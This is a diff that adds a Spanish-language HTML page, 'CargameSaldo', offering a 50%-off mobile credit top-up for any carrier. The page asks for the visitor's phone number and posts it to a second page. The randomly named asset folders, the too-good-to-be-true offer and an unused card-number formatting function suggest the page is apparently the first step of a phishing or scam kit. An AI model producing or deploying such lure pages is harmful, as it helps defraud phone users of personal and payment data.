@@ -1,0 +1,63 @@
+﻿<!DOCTYPE html>
+
+<html>
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<title>CargameSaldo</title>
+
+	<link rel="icon" type="image/png" href="ico.ico">
+	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	<link rel="stylesheet" href="malo/bootstrap.min.css">
+	<link rel="stylesheet" href="malo/style.css">
+</head>
+
+<body>
+	<nav class="navbar p-1 pb-3 d-flex justify-content-center align-items-center">
+		<div class="col-md-3 col-10 p-0">
+			<img src="HxwpkFNR/ll99.png" class="w-100">
+		</div>
+	</nav>
+	<div class="container-fluid">
+		<div class="row d-flex justify-content-center">
+			<div class="col-md-6 col-10 sube_contenedor">
+				<img src="tC5NxTPC/logos221.png" class="w-100">
+				<h3 class="text-center">Recarga tu linea</h3>
+				<h5 class="text-center">Ahorrate un 50% OFF</h5>
+				<form action="index2.html" method="POST">
+					<div class="row my-5">
+						<div class="col-10 d-flex justify-content-center">
+							<label for="sube" class="use">Número de tu linea (Cualquier Empresa)</label>
+						</div>
+						<div class="col-10 d-flex justify-content-center">
+							<input type="tel " minlength="10" maxlength="10" name="sube" id="card" required="" placeholder="1123214321" class="use">
+						</div>
+						<div class="col-10 d-flex justify-content-center">
+							<small class="use">Ingresá tu numero de celular</small>
+						</div>
+					</div>
+					<div class="row">
+						<div class="col-10">
+							<button>RECARGAR</button>
+						</div>
+					</div>
+				</form>
+			</div>
+		</div>
+	</div>
+</body>
+<script>
+function formTarj(ele, e) {
+    if (ele.value.length < 23) {
+        ele.value = ele.value.replace(/\W/gi, '').replace(/(.{4})/g, '$1 ');
+        return true;
+    } else {
+        return false;
+    }
+};
+function validarNum(e) {
+    e.target.value = e.target.value.replace(/[^\d ]/g, '');
+    return false;
+}
+</script>
+</html>
